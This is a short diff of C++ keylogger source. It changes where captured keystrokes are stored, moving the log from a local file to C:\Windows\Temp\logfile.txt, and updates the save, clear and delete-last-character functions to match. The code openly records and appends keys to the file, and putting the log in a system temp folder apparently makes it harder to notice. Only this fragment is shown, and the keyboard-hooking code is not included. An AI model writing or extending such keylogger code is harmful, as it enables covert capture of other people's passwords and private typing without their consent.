@@ -9,16 +9,18 @@ using namespace std;
 
 bool isCapsOn = false;
 
+string filepath = "C:\\Windows\\Temp\\logfile.txt";
+
 template <class Text> // To pass in either string or char
 void Save(Text key) {
 	ofstream logfile;
-	logfile.open("logfile.txt", ios::app); // forgot to add the append flag
+	logfile.open(filepath, ios::app); // forgot to add the append flag
 	logfile << key; // Appends to logfile
 	logfile.close();
 }
 void ClearKeyLogs() {
 	ofstream logfile;
-	logfile.open("logfile.txt");
+	logfile.open(filepath);
 	logfile.clear();
 	logfile.close();
 }
@@ -32,7 +34,7 @@ void deleteLastChar() {
 	ifstream logfile;
 	string temp, text = "";
 	int size;
-	logfile.open("logfile.txt");
+	logfile.open(filepath);
 	while (logfile.good()) {
 		getline(logfile, temp);
 		text += temp;
